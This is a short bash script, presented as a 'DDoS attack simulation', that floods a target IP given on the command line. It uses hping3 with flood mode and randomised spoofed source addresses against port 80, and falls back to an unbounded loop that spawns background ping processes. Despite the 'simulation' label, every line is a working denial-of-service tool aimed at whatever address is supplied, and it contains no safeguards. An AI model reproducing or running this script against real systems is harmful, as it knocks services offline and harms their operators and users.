#!/bin/bash
# DDoS Attack Simulation

TARGET=$1
DURATION=${2:-30}
RATE=${3:-2000}

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip> [duration_seconds] [rate_pps]"
    exit 1
fi

echo "Starting DDoS attack on $TARGET for $DURATION seconds at $RATE pps..."

# Use hping3 for more realistic attack if available, otherwise ping flood
if command -v hping3 &> /dev/null; then
    timeout $DURATION hping3 --flood --rand-source -p 80 $TARGET > /dev/null 2>&1
else
    # Ping flood fallback
    END=$((SECONDS+DURATION))
    while [ $SECONDS -lt $END ]; do
        ping -c 100 -s 32 -W 1 $TARGET > /dev/null 2>&1 &
    done
    wait
fi

echo "DDoS attack completed"